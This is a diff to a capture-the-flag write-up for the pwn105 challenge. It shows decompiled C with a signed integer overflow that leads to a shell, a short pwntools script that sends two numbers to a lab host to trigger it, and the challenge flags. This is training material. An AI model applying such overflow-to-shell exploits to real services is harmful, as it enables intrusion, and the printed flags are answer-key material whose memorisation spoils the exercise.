@@ -192,3 +192,74 @@ By running the script, we can get the shell and cat out the flag.txt!
 ```
 THM{w3lC0m3_4Dm1N}
 ```
+
+# Challenge 4 - pwn104
+
+# Challenge 5 - pwn105
+
+Let's decompile the code to see it's behavior. The following is the code decompiled by IDA.
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  unsigned int num1; // [rsp+Ch] [rbp-14h] BYREF
+  unsigned int num2; // [rsp+10h] [rbp-10h] BYREF
+  unsigned int sum; // [rsp+14h] [rbp-Ch]
+  unsigned __int64 v8; // [rsp+18h] [rbp-8h]
+
+  v8 = __readfsqword(0x28u);
+  setup(argc, argv, envp);
+  banner();
+  puts("-------=[ BAD INTEGERS ]=-------");
+  puts("|-< Enter two numbers to add >-|\n");
+  printf("]>> ");
+  __isoc99_scanf("%d", &num1);
+  printf("]>> ");
+  __isoc99_scanf("%d", &num2);
+  sum = num1 + num2;
+  if ( (num1 & 0x80000000) != 0 || (num2 & 0x80000000) != 0 )
+  {
+    printf("\n[o.O] Hmmm... that was a Good try!\n");
+  }
+  else if ( (sum & 0x80000000) != 0 )
+  {
+    printf("\n[*] C: %d", sum);
+    puts("\n[*] Popped Shell\n[*] Switching to interactive mode");
+    system("/bin/sh");
+  }
+  else
+  {
+    printf("\n[*] ADDING %d + %d", num1, num2);
+    printf("\n[*] RESULT: %d\n", sum);
+  }
+  return v8 - __readfsqword(0x28u);
+}
+```
+
+According to the code, we can know the following things.
+
+1. This program takes two int as the input & stored them as `unsigned int`.
+2. If the MSB (sign bit) of `num1` or `num2` is not equal to 0, which means one of the num is less than 0, the program will output "\n[o.O] Hmmm... that was a Good try!\n" and exit the program.
+3. Else if the MSB of the sum is less than 0, the program will return a shell, which is the winning condition.
+4. Else the program will  outuput the sum and exit.
+
+Since we can't input any negative number or it will exit, we need another way to make the sum negative. We know that the maximum of an `unsigned int` is $2^{31}-1$ and the MSB represents a sign, so we can input the maximum of the unsigned int as one of the num and input another int less than $2^{31}-1$ to make the `sum` overflow, then it will be a negative int! The following is the exploit.
+
+```python
+from pwn import *
+
+r = remote("10.10.107.8", 9005)
+
+r.sendline(b"2147483647")
+r.sendline(b"1")
+r.interactive()
+```
+
+Here, I send 2147483647 and 1 to make the sum overflow to be -2147483648. That way, we can get the shell.
+
+![Pwned](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240727180209127.png)
+
+```
+THM{VerY_b4D_1n73G3rsss}
+```
+
